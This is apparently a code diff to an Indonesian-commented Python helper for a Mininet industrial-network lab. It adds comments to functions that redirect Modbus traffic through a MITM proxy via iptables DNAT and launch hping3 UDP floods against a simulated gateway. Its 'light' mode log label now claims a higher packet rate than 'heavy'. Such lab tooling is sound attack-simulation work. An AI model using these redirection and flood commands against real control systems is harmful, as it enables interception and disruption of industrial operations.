@@ -1,8 +1,11 @@
+# h5 adalah helper attacker: mengaktifkan MITM route/DNAT/proxy dan trafik DoS
+# dari dalam topologi Mininet, tetapi bukan service yang berjalan terus seperti h1-h4.
 import os
 import sys
 from datetime import datetime
 from typing import Optional
 
+# Nama host default mengikuti topologi saat ini.
 DEFAULT_RTU_NAME = "h2"
 DEFAULT_GATEWAY_NAME = "h3"
 DEFAULT_ATTACKER_NAME = "h5"
@@ -11,6 +14,7 @@ RUN_ID_FILE = "/tmp/mitm_run_id"
 BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
 
 
+# Parameter jaringan attacker: foothold awal di Control, lalu lateral ke Field saat MITM.
 CONTROL_SUBNET = "10.0.2.0/24"
 # Harus sama dengan escalate_attacker_to_field di topology.j2 (bukan output generator).
 ATTACKER_FIELD_IP = "10.0.1.100"
@@ -19,13 +23,16 @@ MODBUS_PORT = 5020
 MITM_PROXY_PORT = 50201
 
 def _new_run_id():
+    """Run id sederhana untuk mengaitkan flag MITM dengan log host."""
     return datetime.now().strftime("%Y%m%d_%H%M%S")
 
 def _resolve_host_log(attacker_name: str, host_log_dir: Optional[str] = None) -> str:
+    """Tentukan file log attacker untuk sesi saat ini."""
     base = host_log_dir or os.path.join(BASE_DIR, "logs", "host")
     return os.path.join(base, f"{attacker_name}.log")
 
 def _iptables_dnat_modbus(attacker, attacker_name: str, gateway_ip: str, enable: bool):
+    """Pasang/hapus DNAT agar koneksi Modbus RTU ke gateway melewati proxy MITM."""
     eth1 = f"{attacker_name}-eth1"
     dest = f"{ATTACKER_FIELD_IP}:{MITM_PROXY_PORT}"
     if enable:
@@ -44,7 +51,7 @@ def _iptables_dnat_modbus(attacker, attacker_name: str, gateway_ip: str, enable:
         )
 
 def _run_mitm_proxy_entrypoint():
-    """Modbus proxy statis: Code/script/mitm/modbus_proxy.py (bukan hasil template)."""
+    """Jalankan proxy Modbus statis: Fix/script/mitm/modbus_proxy.py."""
     import importlib.util
 
     path = os.path.join(BASE_DIR, "script", "mitm", "modbus_proxy.py")
@@ -107,6 +114,7 @@ def run_mitm_attack(
     )
 
 def run_dos_attack(net, mode="light", host_log_dir=None):
+    """Jalankan DoS UDP dari h5 ke gateway; mode menentukan intensitas trafik."""
     h5 = net.get('h5')
     target_ip = "10.0.2.2"
     target_port = 5001
@@ -123,8 +131,8 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
         print("Running LIGHT DoS (controlled mixed traffic)")
         h5.cmd(f"echo '\\n===== DoS LIGHT {timestamp} =====' >> {host_log_q}")
 
-        # UDP
-        h5.cmd(f"echo '[DOS][LIGHT][UDP] start pps~500 duration=45s' >> {host_log_q}")
+        # Light: paket UDP berkala agar mengganggu tanpa saturasi ekstrem.
+        h5.cmd(f"echo '[DOS][LIGHT][UDP] start pps~5000 duration=45s' >> {host_log_q}")
         h5.cmd(
             f"bash -lc 'hping3 --udp -q -p {target_port} -d 128 -i u200 {target_ip} >> {host_log_q} 2>&1 &'"
         )
@@ -133,7 +141,7 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
         print("Running HEAVY DoS (controlled high-rate attack)")
         h5.cmd(f"echo '\\n===== DoS HEAVY {timestamp} =====' >> {host_log_q}")
 
-        # UDP heavy (tanpa flood, tapi cepat)
+        # Heavy: flood UDP untuk memberi tekanan jaringan lebih tinggi.
         h5.cmd(f"echo '[DOS][HEAVY][UDP] start pps~3000 duration=60s' >> {host_log_q}")
         h5.cmd(
             f"bash -lc 'hping3 --udp --flood -p {target_port} -d 128 {target_ip} >> {host_log_q} 2>&1 &'"
@@ -141,5 +149,6 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
 
 
 if __name__ == "__main__":
+    # Entrypoint ini dipakai saat h5 meluncurkan proxy di background via Mininet cmd.
     if len(sys.argv) >= 2 and sys.argv[1] == "modbus-mitm-proxy":
         _run_mitm_proxy_entrypoint()
